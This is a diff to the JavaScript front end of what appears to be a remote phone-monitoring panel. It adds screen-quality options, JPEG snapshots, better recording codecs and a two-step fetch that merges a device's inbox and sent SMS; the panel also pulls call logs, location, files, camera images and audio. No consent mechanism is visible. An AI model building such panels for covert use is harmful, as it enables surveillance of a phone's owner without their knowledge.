@@ -291,22 +291,28 @@ async function toggleScreen(){
     document.getElementById('screenBtn').innerText='Stop Screen';
     panel().innerHTML=`
       <div class="screen-toolbar">
-        <span style="font-size:12px;color:#4b5563;font-weight:600">QUALITY</span>
-        <select id="sqSel" onchange="changeScreenQ(this.value)">
+        <span style="font-size:12px;color:#64748b;font-weight:600">QUALITY</span>
+        <select id="sqSel">
           <option value="360p">360p — Low bandwidth</option>
           <option value="720p" selected>720p — Balanced</option>
           <option value="1080p">1080p — High quality</option>
+          <option value="1440p">1440p — Ultra HD</option>
         </select>
-        <button onclick="snapScreen()">📸 Screenshot</button>
-        <button id="screenRecBtn" onclick="toggleScreenRec()">⏺ Record</button>
-        <button class="stop" onclick="toggleScreen()">⏹ Stop</button>
+        <button id="screenSnapBtn">📸 Screenshot</button>
+        <button id="screenRecBtn">⏺ Record</button>
+        <button id="screenStopBtn" class="stop">⏹ Stop</button>
       </div>
       <video id="screenVideo" autoplay playsinline style="width:100%;max-height:72vh;border-radius:8px;background:#000"></video>`;
+    // Bind buttons AFTER innerHTML is set
+    document.getElementById('sqSel').onchange=e=>changeScreenQ(e.target.value);
+    document.getElementById('screenSnapBtn').onclick=snapScreen;
+    document.getElementById('screenRecBtn').onclick=toggleScreenRec;
+    document.getElementById('screenStopBtn').onclick=toggleScreen;
   }catch(e){ console.error(e); screenPC=null; panel().innerHTML='<div style="color:#f87171">Failed: '+e.message+'</div>'; }
 }
 
 const Q_PRESETS={
-  '360p':{br:600000},'720p':{br:1500000},'1080p':{br:3500000}
+  '360p':{br:600000},'720p':{br:1500000},'1080p':{br:3500000},'1440p':{br:6000000}
 };
 function changeScreenQ(p){
   if(!screenPC) return;
@@ -325,7 +331,7 @@ function snapScreen(){
   const c=document.createElement('canvas');
   c.width=v.videoWidth;c.height=v.videoHeight;
   c.getContext('2d').drawImage(v,0,0);
-  c.toBlob(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='screen_'+Date.now()+'.png';a.click();},'image/png');
+  c.toBlob(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='screen_'+Date.now()+'.jpg';a.click();},'image/jpeg',0.92);
 }
 function toggleScreenRec(){
   screenMR&&screenMR.state==='recording' ? stopScreenRec() : startScreenRec();
@@ -334,7 +340,7 @@ function startScreenRec(){
   const v=document.getElementById('screenVideo');
   if(!v||!v.srcObject){return;}
   screenChunks=[];
-  const mime=MediaRecorder.isTypeSupported('video/webm;codecs=vp9')?'video/webm;codecs=vp9':'video/webm';
+  const mime=getBestVideoMime();
   screenMR=new MediaRecorder(v.srcObject,{mimeType:mime});
   screenMR.ondataavailable=e=>{if(e.data.size>0)screenChunks.push(e.data);};
   screenMR.onstop=()=>{
@@ -385,7 +391,18 @@ function takeSnapshot(){
   const ctx=c.getContext('2d');
   if(rot){ctx.translate(c.width/2,c.height/2);ctx.rotate(Math.PI/2);ctx.drawImage(v,-v.videoWidth/2,-v.videoHeight/2);}
   else ctx.drawImage(v,0,0);
-  c.toBlob(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='snap_'+Date.now()+'.png';a.click();},'image/png');
+  c.toBlob(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='snap_'+Date.now()+'.jpg';a.click();},'image/jpeg',0.92);
+}
+// Best video MIME: VP9 (best quality/size) > VP8 > plain WebM
+function getBestVideoMime(){
+  const candidates=[
+    'video/webm;codecs=vp9,opus',
+    'video/webm;codecs=vp9',
+    'video/webm;codecs=vp8,opus',
+    'video/webm;codecs=vp8',
+    'video/webm'
+  ];
+  return candidates.find(m=>MediaRecorder.isTypeSupported(m))||'video/webm';
 }
 function toggleCamRec(){ camMR&&camMR.state==='recording'?stopCamRec():startCamRec(); }
 function startCamRec(){
@@ -405,21 +422,23 @@ function startCamRec(){
     };
     stream=c.captureStream(30);
     v.srcObject.getAudioTracks().forEach(t=>stream.addTrack(t));
-    camMR=new MediaRecorder(stream,{mimeType:'video/webm'});
+    const _mime1=getBestVideoMime();
+    camMR=new MediaRecorder(stream,{mimeType:_mime1});
     camMR.ondataavailable=e=>{if(e.data.size>0)camChunks.push(e.data);};
     camMR.onstop=()=>{
-      const b=new Blob(camChunks,{type:'video/webm'});
+      const b=new Blob(camChunks,{type:_mime1});
       const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='cam_'+Date.now()+'.webm';a.click();
     };
-    camMR.start(1000); requestAnimationFrame(draw);
+    camMR.start(500); requestAnimationFrame(draw);
   } else {
-    camMR=new MediaRecorder(stream,{mimeType:'video/webm'});
+    const _mime2=getBestVideoMime();
+    camMR=new MediaRecorder(stream,{mimeType:_mime2});
     camMR.ondataavailable=e=>{if(e.data.size>0)camChunks.push(e.data);};
     camMR.onstop=()=>{
-      const b=new Blob(camChunks,{type:'video/webm'});
+      const b=new Blob(camChunks,{type:_mime2});
       const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='cam_'+Date.now()+'.webm';a.click();
     };
-    camMR.start(1000);
+    camMR.start(500); // 500ms chunks for smoother recording
   }
   const btn=document.getElementById('camRecBtn');
   if(btn) btn.innerText='⏹ Stop Rec';
@@ -469,9 +488,11 @@ function sendCommand(cmd,params){
   setTimeout(()=>{ if(pendingCmd===cmd) pendingCmd=null; },15000);
 }
 function sendPlain(msg){ ws&&ws.readyState===1&&ws.send(msg); }
-// SMS: fetch all messages (inbox+sent) in one request; filter client-side
+// SMS: fetch inbox+sent separately (Android doesn't support box='all'), merge client-side
 let allSmsData=[];
 let smsFilt='all'; // 'all' | 'inbox' | 'sent'
+let _smsPendingInbox=false, _smsPendingSent=false;
+let _smsInboxBuf=[], _smsSentBuf=[];
 
 function toggleSmsGroup(){
   const hdr=document.getElementById('smsGroupHdr');
@@ -479,42 +500,60 @@ function toggleSmsGroup(){
   const isOpen=sub.classList.contains('open');
   sub.classList.toggle('open',!isOpen);
   hdr.classList.toggle('open',!isOpen);
-  if(!isOpen && !allSmsData.length){
-    // First open: fetch all SMS
-    sendCommand('GET_SMS',{box:'all'});
+  if(!isOpen && !allSmsData.length){ fetchAllSms(); }
+}
+
+function fetchAllSms(){
+  // Fetch inbox first; sent fetched after inbox arrives
+  _smsPendingInbox=true; _smsPendingSent=false;
+  _smsInboxBuf=[]; _smsSentBuf=[];
+  panel().innerHTML='<div style="padding:20px;color:#64748b">📨 Loading SMS…</div>';
+  sendCommand('GET_SMS',{box:'inbox'});
+}
+
+// Called by SMS_DATA handler — accumulates inbox then sent, then merges
+function onSmsChunk(arr){
+  if(_smsPendingInbox){
+    _smsInboxBuf=arr;
+    _smsPendingInbox=false;
+    _smsPendingSent=true;
+    sendCommand('GET_SMS',{box:'sent'});
+    return;
   }
+  if(_smsPendingSent){
+    _smsSentBuf=arr;
+    _smsPendingSent=false;
+    // Merge and sort by timestamp desc
+    allSmsData=[..._smsInboxBuf,..._smsSentBuf].sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
+    applySmsFilt();
+    return;
+  }
+  // Fallback: single response
+  allSmsData=arr;
+  applySmsFilt();
 }
 
 function filterSmsType(type){
   smsFilt=type;
-  // Highlight active sub-btn
-  document.querySelectorAll('.sms-sub-btn').forEach(b=>{
-    b.style.background=b.innerText.toLowerCase().includes(type==='all'?'all':type==='inbox'?'inbox':'sent')?'#eff6ff':'';
-    b.style.color=b.innerText.toLowerCase().includes(type==='all'?'all':type==='inbox'?'inbox':'sent')?'#2563eb':'';
-  });
-  if(!allSmsData.length){
-    sendCommand('GET_SMS',{box:'all'});
-    return;
-  }
+  if(!allSmsData.length){ fetchAllSms(); return; }
   applySmsFilt();
 }
 
 function applySmsFilt(){
   dataType='sms'; currentPage=0;
-  if(smsFilt==='all'){
-    currentData=allSmsData;
-  } else if(smsFilt==='inbox'){
-    currentData=allSmsData.filter(i=>{
-      const t=String(i.type||'').toLowerCase(); const r=parseInt(i.type)||0;
-      return t.includes('in')||r===1;
-    });
+  if(smsFilt==='all'){ currentData=allSmsData; }
+  else if(smsFilt==='inbox'){
+    currentData=allSmsData.filter(i=>isSmsIncoming(i));
   } else {
-    currentData=allSmsData.filter(i=>{
-      const t=String(i.type||'').toLowerCase(); const r=parseInt(i.type)||0;
-      return t.includes('out')||r===2||r===4;
-    });
+    currentData=allSmsData.filter(i=>!isSmsIncoming(i));
   }
   renderTable();
+}
+
+// Android sends type as "Incoming"/"Outgoing" strings
+function isSmsIncoming(i){
+  const t=String(i.type||'').toLowerCase();
+  return t==='incoming'||t.startsWith('in')||parseInt(i.type)===1;
 }
 function openFileManager(){ currentTreePath='root'; activeFolderPath='root'; fileCache={}; treeState={}; sendCommand('LIST_FILES',{path:'root'}); }
 
@@ -523,8 +562,7 @@ function handleJSON(json){
   if(json.type==='SIGNALING'){ handleSig(json.data); return; }
   switch(json.type){
     case 'SMS_DATA':
-      allSmsData=parseData(json.data);
-      applySmsFilt(); pendingCmd=null; break;
+      onSmsChunk(parseData(json.data)); pendingCmd=null; break;
     case 'CALL_LOGS':
       dataType='call'; currentPage=0;
       currentData=parseData(json.data);
@@ -569,7 +607,7 @@ function handleJSON(json){
         handleFileList(arr); pendingCmd=null;
       } else if(pendingCmd==='GET_SMS'||pendingCmd==='GET_CALL_LOGS'){
         const arr=Array.isArray(json)?json:(json.data?parseData(json.data):[]);
-        if(pendingCmd==='GET_SMS'){ allSmsData=arr; applySmsFilt(); }
+        if(pendingCmd==='GET_SMS'){ onSmsChunk(arr); }
         else { dataType='call'; currentData=arr; currentPage=0; renderTable(); }
         pendingCmd=null;
       }
@@ -585,7 +623,7 @@ function handlePlain(msg){
   if(msg.startsWith('STATUS:')) setStatus(msg.substring(7));
   else if(msg.startsWith('LOC_DATA:')){ try{ renderMap(JSON.parse(msg.substring(9))); pendingCmd=null; }catch(e){} }
   else if(msg.startsWith('FILE_LIST:')){ try{ handleFileList(JSON.parse(msg.substring(10))); pendingCmd=null; }catch(e){} }
-  else if(msg.startsWith('SMS_DATA:')){ try{ allSmsData=JSON.parse(msg.substring(9)); applySmsFilt(); pendingCmd=null; }catch(e){} }
+  else if(msg.startsWith('SMS_DATA:')){ try{ onSmsChunk(JSON.parse(msg.substring(9))); pendingCmd=null; }catch(e){} }
   else if(msg.startsWith('CALL_DATA:')){ try{ currentData=JSON.parse(msg.substring(10)); dataType='call'; renderTable(); pendingCmd=null; }catch(e){} }
   else if(msg.startsWith('CAMERA_IMAGE:')){ displayCapturedImage(msg.substring(13)); pendingCmd=null; }
   else if(msg.startsWith('AUDIO_RECORDING:')){ showAudio(msg.substring(16)); pendingCmd=null; }
@@ -735,7 +773,7 @@ function renderTable(){
     }).join('');
   }
 
-  const smsHeaders='<th style="width:82px">Type</th><th>Number</th><th>Message</th><th style="width:110px">Date</th>';
+  const smsHeaders='<th style="width:92px">Type</th><th>Number</th><th>Message</th><th style="width:130px">Date/Time</th>';
   const callHeaders='<th style="width:90px">Type</th><th>Number</th><th>Name</th><th style="width:110px">Date</th><th style="width:100px">Duration</th>';
 
   let pager='';
